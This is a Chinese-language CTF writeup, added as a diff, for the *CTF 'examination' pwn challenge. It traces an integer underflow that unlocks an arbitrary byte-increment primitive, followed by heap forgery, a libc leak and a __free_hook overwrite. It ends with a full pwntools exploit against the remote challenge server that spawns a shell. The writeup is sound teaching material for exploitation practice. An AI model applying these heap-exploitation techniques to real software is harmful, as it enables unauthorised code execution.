@@ -1,0 +1,165 @@
+
+# [starctf]examination writeup
+
+第一次在正儿八经的比赛上写出一道`pwn`,还是很兴奋的，很可能是整个ctf生涯的巅峰了（说不定哪天就放弃了）。
+
+其实第二题`babynote`的`uaf`其实看出来了，但学的太少，全新接触`musl`，搭环境之类的太繁琐了，`debug`始终出不来`mal`结构体。求大佬赐教。
+
+回到第一题，正如官方`wp`所说，时间大部分在于逆向上，相比第二题，洞还是很好看出来的。因为这是一道典型金手指式的`ctf`题，洞因为肯定在金手指附近嘛。
+
+看了下官方`wp`，基本是打`tcache_struct`来获得`unsorted bin`,个人觉得繁了，毕竟这题是任意`add one`的金手指啊，个人觉得自己的方法还是不错的。
+
+## 题目复现
+
+题目全开，因此很难打`got`
+
+![图片描述](upload/attach/202204/945391_JPZ6TXKVJ4SQDHH.png)
+
+题目大概意思就是能以老师学生两种身份执行一些功能：老师身份有一个菜单，学生身份一个菜单。审计代码后粗略得到两个结构体：`student`和`teacher`
+
+```
+struct Student
+{
+Teacher \*teacher;
+\_\_int64 unknown;
+\_\_int64 pray\_score;
+int is\_lazy;
+int is\_reward;
+\_\_int64 unknown2;
+};
+struct Teacher
+{
+int question\_num;
+int score;
+char \*comment;
+\_\_int64 comment\_size;
+};
+```
+
+学生`checkReview`函数可以得到金手指：如果分数超过131时可以获得堆地址，还能在任意字节处`add one`
+
+![图片描述](upload/attach/202204/945391_ZYB6QEU52ZV6QUU.png)
+
+因此考虑分数，回到`teacher` `giveScore`函数，发现`is_lazy`为1时可以减10，如果原得分小于10就会溢出。只要`question_num`为1原分数一定小于10
+
+![图片描述](upload/attach/202204/945391_RBMM2X7JRS9URB8.png)
+
+需要注意的是，这题无法直接得到`unsorted bin`，需要构造得到
+
+因此，我们在有堆地址和任意`addone`的情况下，设计利用思路
+
+## 解题思路
+
+1. `add student`时设置`question_num`为1，学生身份`pray`，教师身份`giveScore`,学生身份`checkReview`，获得金手指
+2. 注意`teacher`的`comment`系统，`comment`在金手指前是有读写权限的，金手指后也有写权限，范围由`comment_size`决定。
+
+如果我们扩大`comment_size`就可以堆块任意写了，`我们只要在(&comment_size+n)处addone(n<8)，就可以大幅度扩大这个数`
+3. 由于`student1`金手指丧失了读权限，我们用已知的堆地址对`student2`一直`fake`到`student2`的`comment_size`,至此堆块完全可读可写
+4. 为了`leak libc`,我们得拿到`unsorted bin`,此处我想到两种方式：
+
++ 比赛时，我先分配一个`0x310`的`chunk`，然后和前面一样错位`add1`变成`0x410`再释放
++ 比赛后，我发现其实任意写`fake`就行了
+
+但两种方式都需要辅助一些`chunk`，让`unsorted bin`的`next chunk`是正常的
+5. 对`student2`卸磨杀驴，直接把它的`comment`指针改成`free_hook`写`system`就行了
+
+可以看出，我的方法基本不用任何堆分配机制，和入门题是一样的
+
+## payload
+
+```
+from pwn import *
+context.log_level = 'debug'
+def lg(s,addr):
+print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
+#io = process('./examination')
+elf = ELF('./examination')
+libc = ELF('libc-2.31.so')
+io = remote('124.70.130.92', 60001)
+def role(idx):
+io.sendlineafter('>>', '5')
+io.sendlineafter('role', str(idx))
+def comment(idx, size, content):
+io.sendlineafter('>>', '3')
+io.sendlineafter('which one', str(idx))
+io.sendlineafter('comment', str(size))
+io.sendlineafter('comment', content)
+def add():
+io.sendlineafter('>>', '1')
+io.sendlineafter('questions:', '1')
+def delete(idx):
+io.sendlineafter('>>', '4')
+io.sendlineafter('choose', str(idx))
+def edit(idx, content):
+io.sendlineafter('>>', '3')
+io.sendlineafter('which one', str(idx))
+io.sendafter('comment', content)
+def change_id(idx):
+role(1)
+io.sendlineafter('>>','6')
+io.sendlineafter('id', str(idx))
+def addr_add_one():
+role(1)
+io.sendlineafter('>>', '3')
+role(0)
+io.sendlineafter('>>', '2')
+role(1)
+io.sendlineafter('>>', '2')
+def addr_add_one2():
+role(1)
+change_id(2)
+io.sendlineafter('>>', '3')
+role(0)
+io.sendlineafter('>>', '2')
+role(1)
+change_id(2)
+io.sendlineafter('>>', '2')
+#gdb.attach(io)
+io.sendlineafter('role', '0')
+add()#0
+comment(0, 0x18, 'overlapper')
+addr_add_one() #0
+io.recvuntil('0x')
+heap_addr = int(io.recv(12),16) - 0x2a0
+lg('heap addr', heap_addr)
+comment_size_addr = heap_addr + 0x2e1
+io.sendafter('addr', str(comment_size_addr))
+role(0)
+add()#1
+comment(1, 0x18, 'reader')
+payload = p64(0)*3 + p64(0x31) + p64(heap_addr+0x340) + p64(0)*4 + p64(0x21) + p64(1) + p64(heap_addr + 0x360) + p64(0x200)
+edit(0, payload)
+#leak libc
+add() #2
+comment(2, 0x380, 'leak libc')
+add() #3
+comment(3, 0xa0, 'helper')
+add() #4
+addr_add_one2()
+unsorted_bin_addr = heap_addr + 0x3c9
+io.sendafter('addr', str(unsorted_bin_addr))
+role(0)
+delete(2)
+role(1)
+change_id(1)
+io.sendlineafter('>>', '2')
+libc_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
+lg('libc addr', libc_addr)
+offset = 0x7f841a9cdbe0 - 0x7f841a7e1000
+libc_base = libc_addr - offset
+free_hook = libc_base + libc.sym['__free_hook']
+sys_addr = libc_base + libc.sym['system']
+lg('libc base', libc_base)
+# pwn
+role(0)
+payload = p64(0)*3 + p64(0x31) + p64(heap_addr + 0x340) + p64(0)*4 + p64(0x21) + p32(1) + p32(1) + p64(free_hook-8)
+edit(0, payload)
+edit(1, b'/bin/sh\x00'+p64(sys_addr))
+delete(1)
+#gdb.attach(io)
+io.interactive()
+```
+
+## 总结
+
+构建`unsorted bin`本来我也想着打`tcache struct`,后来发现完全没必要。堆体应该对每个堆的读写权限吃透，再找出相对实用的方式
